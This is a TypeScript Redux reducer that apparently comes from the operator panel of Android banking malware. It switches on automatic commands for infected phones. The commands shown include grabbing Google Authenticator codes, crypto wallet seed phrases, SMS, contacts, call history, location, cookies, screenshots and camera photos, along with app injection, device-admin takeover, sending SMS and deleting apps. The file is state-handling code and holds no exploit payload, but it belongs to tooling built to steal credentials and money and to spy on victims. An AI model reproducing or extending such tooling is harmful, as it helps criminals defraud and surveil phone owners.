import {ACActionTypes, ACChangeCommandFieldsPayload, ACChangeEnabledPayload, AutoCommandsState} from "./Types";

const initalState: AutoCommandsState = {
    getaccounts: {
        enabled: false,
    },
    getinstallapps: {
        enabled: false,
    },
    updateinjectandlistapps: {
        enabled: false,
    },
    googleAuthGrabber: {
        enabled: false,
    },
    calling: {
        enabled: false,
        number: "",
        locked: false,
    },
    startinject: {
        enabled: false,
        application: "",
    },
    push: {
        enabled: false,
        text: "",
        title: "",
        application: "",
    },
    sendsms: {
        enabled: false,
        number: "+",
        message: "",
    },
    seedPhrase: {
        enabled: false,
        wallets: [],
    },
    clearcache: {
        enabled: false,
        application: "",
    },
    runApp: {
        enabled: false,
        application: "",
    },
    deleteapplication: {
        enabled: false,
        application: "",
    },
    openurl: {
        enabled: false,
        url: "",
    },
    getcallhistory: {
        enabled: false,
    },
    getcontacts: {
        enabled: false,
    },
    getlocation: {
        enabled: false,
    },
    getimages: {
        enabled: false,
    },
    getsms: {
        enabled: false,
    },
    startadmin: {
        enabled: false,
    },
    takescreenshot: {
        enabled: false,
    },
    startauthenticator2: {
        enabled: false,
    },
    protect: {
        enabled: false,
    },
    cookie: {
        enabled: false,
    },
    takephoto: {
        enabled: false,
    },
    isLoaded: false,
};

const acChangeEnabled = (state: AutoCommandsState, payload: ACChangeEnabledPayload): AutoCommandsState => {
    return {
        ...state,
        [payload.command]: {
            ...state[payload.command],
            enabled: payload.enabled,
        },
    };
};

const acChangeCommandFields = (state: AutoCommandsState, payload: ACChangeCommandFieldsPayload): AutoCommandsState => {
    return {
        ...state,
        ...payload,
        isLoaded: true,
    };
};

const acReducer = (state: AutoCommandsState = initalState, action: ACActionTypes): AutoCommandsState => {
    switch (action.type) {
    case "AC_CHANGE_ENABLED":
        return acChangeEnabled(state, action.payload);
    case "AC_CHANGE_COMMAND_FIELDS":
        return acChangeCommandFields(state, action.payload);
    default:
        return state;
    }
};

export default acReducer;
